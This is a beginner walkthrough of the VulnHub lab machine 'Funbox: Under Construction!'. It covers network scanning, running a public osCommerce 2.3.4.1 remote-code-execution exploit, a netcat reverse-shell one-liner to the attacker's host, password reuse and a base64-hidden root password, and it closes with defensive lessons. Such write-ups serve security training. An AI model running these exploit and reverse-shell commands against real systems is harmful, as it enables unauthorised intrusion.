# Funbox: Under Construction! — VulnHub Walkthrough (Beginner Friendly)

> An out-of-the-box e-commerce app (**osCommerce**) with its installer still
> reachable, a database password reused as a Linux password, and a stray
> `cron.sh` that leaks the root password in base64. A perfect "first real box".

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Under Construction! (Funbox 10) |
| **Difficulty** | Easy |
| **Author** | [0815R2d2](https://twitter.com/0815R2d2) |
| **Released** | 19 Jul 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-under-construction,715/ |
| **Download** | https://vulnhub.com/entry/funbox-under-construction,715/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Debian) |

> **Lab note:** This box runs best on **VirtualBox**. Your target IP will differ —
> replace `192.168.56.101` with whatever your own lab gives you.

---

## 0. What you will learn

- Enumerating a web server to reveal a **CMS and its exact version**.
- Turning a version number into a working exploit with `searchsploit`.
- Exploiting **osCommerce 2.3.4.1** RCE (Exploit-DB **50128**) — unauthenticated
  command execution via a leftover `install/` directory.
- Upgrading a dumb RCE into a **reverse shell**.
- Password **reuse** between a web app's database config and a Linux user.
- Reading a **base64 secret** out of an overlooked sample file to get root.

---

## 1. Reconnaissance — finding the target

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.101  08:00:27:a1:b2:c3      2     120  PCS Systemtechnik GmbH
```

> **Why it works:** ARP scanning finds live hosts on your LAN without needing
> prior knowledge of their addresses. Target = `192.168.56.101`.

![netdiscover output](images/01-netdiscover.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -sC -sV -p- 192.168.56.101 -oN nmap.txt
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
```

A full mail stack (SMTP/POP3/IMAP) plus a web server. Start with the website.

> **Why it works:** `-sV` tells us the *software and version* on each port. Mail
> services are worth noting for later, but the web app is the obvious first stop.

![nmap scan](images/02-nmap.png)

### Directory brute force

```bash
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```text
/catalog            (Status: 301) [--> http://192.168.56.101/catalog/]
```

Open `http://192.168.56.101/catalog/`:

![osCommerce store](images/03-oscommerce.png)

The footer/source reveals the app and version:

```text
Powered by osCommerce 2.3.4.1
```

> **Why it works:** The exact version string is gold — it maps directly to known
> public exploits.

---

## 3. Foothold — gaining the first shell

### Find the exploit

```bash
searchsploit oscommerce 2.3.4.1
```

```text
osCommerce 2.3.4.1 - Remote Code Execution (2)   | php/webapps/50128.py
osCommerce 2.3.4.1 - Arbitrary File Upload       | php/webapps/47199.txt
```

Copy the RCE exploit and run it:

```bash
searchsploit -m php/webapps/50128.py
python3 50128.py http://192.168.56.101/catalog/
```

```text
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: www-data
RCE_SHELL$ whoami
www-data
```

> **Why it works:** osCommerce's **installer** (`/catalog/install/install.php`)
> was never deleted. The `step=4` ("finish") routine writes the `DB_DATABASE`
> parameter straight into `install/includes/configure.php` without sanitising it.
> We inject `');passthru('...');/*`, and the app then executes our command when it
> loads `configure.php`. This needs **no authentication at all**.

### Upgrade to a reverse shell

Start a listener in another terminal:

```bash
nc -nvlp 5555
```

Then, in the `RCE_SHELL`:

```bash
RCE_SHELL$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 5555 >/tmp/f
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 45132
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** The named pipe (`mkfifo`) plus `nc` creates a two-way link
> between the shell and your listener. Now you have an interactive `www-data`
> shell.

### Note the database credentials

```bash
$ cat /var/www/html/catalog/install/includes/configure.php.bak
```

```text
define('DB_SERVER_USERNAME', 'jack');
define('DB_SERVER_PASSWORD', 'yellow');
```

> **Why it works:** That backup config file was left behind with the database
> password in plaintext. Save it — it may be reused for a system account.

---

## 4. Privilege escalation — becoming root

### Reuse the password for a Linux user

```bash
$ su jack
Password:            # yellow
jack@funbox10:/var/www/html/catalog/install/includes$
```

> **Why it works:** Password **reuse**. The DB password `yellow` was also the
> `jack` system account's password.

> **Why not SSH?** This box's `sshd_config` restricts `AllowUsers joe susan`, so
> `jack` cannot log in over SSH. Local `su` still works.

### Hunt for the base64 secret

`jack` cannot read every home directory, but the filesystem still holds lazy
leftovers. Look at sample/doc directories:

```bash
jack@funbox10:~$ cat /usr/share/doc/examples/cron.sh
```

```text
# cron.sh sample file
# 0 20 * * * /bin/goahead --parameter: LXUgcm9vdCAtcCByZnZiZ3QhIQ==
```

Decode the base64:

```bash
jack@funbox10:~$ echo 'LXUgcm9vdCAtcCByZnZiZ3QhIQ==' | base64 -d
-u root -p rfvbgt!!
```

That is literally root's password (`-u root -p rfvbgt!!`).

> **Why it works:** "Security by obscurity" — someone parked a real root
> credential inside a fake cron sample in a documentation folder, hoping nobody
> would read it. `grep -r` / manual review find it anyway.

### Become root

```bash
jack@funbox10:~$ su - root
Password:            # rfvbgt!!
root@funbox10:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@funbox10:~# cat /root/root.txt
```

![root shell](images/05-root.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Leftover installer directory | `/catalog/install/install.php` | Unauthenticated RCE |
| 2 | osCommerce 2.3.4.1 parameter injection | `install.php?step=4` | Command execution as `www-data` |
| 3 | Plaintext DB password in a backup config | `configure.php.bak` | Credential disclosure |
| 4 | Password reuse (DB → system) | `jack` account | Local user access |
| 5 | Root password stored in a fake `cron.sh` (base64) | `/usr/share/doc/examples/` | Direct root compromise |

---

## 6. Defensive lessons (blue team)

- **Delete installers when deployment is finished.** The osCommerce install
  directory is the entire vulnerability here.
- **Never leave `.bak` / backup config files in the web root.** They routinely
  contain plaintext secrets.
- **Patch third-party apps**; e-commerce platforms are high-value targets and
  version strings are public knowledge.
- **No password reuse.** A leaked app password must never open a shell.
- **Do not hide secrets in "sample" files.** Base64 is *encoding*, not
  encryption — treat any credential in a repo or doc folder as compromised.
- **Least privilege:** the web server ran as `www-data` and a normal user held
  root's password — neither should be possible.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-under-construction,715/
- Exploit-DB 50128 (osCommerce RCE): https://www.exploit-db.com/exploits/50128
- NepCodeX walkthrough: https://nepcodex.com/2021/07/funbox-under-construction-walkthrough/
- devl00p writeup: https://devl00p.github.io/posts/Solution-du-CTF-Funbox-Under-Construction-de-VulnHub/
- GTFOBins: https://gtfobins.github.io/

---

## 8. Screenshot checklist

| # | File | What to capture |
| --- | --- | --- |
| 1 | `images/01-netdiscover.png` | Target IP from `netdiscover` |
| 2 | `images/02-nmap.png` | Nmap results (22, 25, 80, 110, 143) |
| 3 | `images/03-oscommerce.png` | The `/catalog` osCommerce store page + version |
| 4 | `images/04-rce.png` | Exploit 50128 dropping you into `RCE_SHELL` |
| 5 | `images/05-root.png` | Root shell after `su - root` |
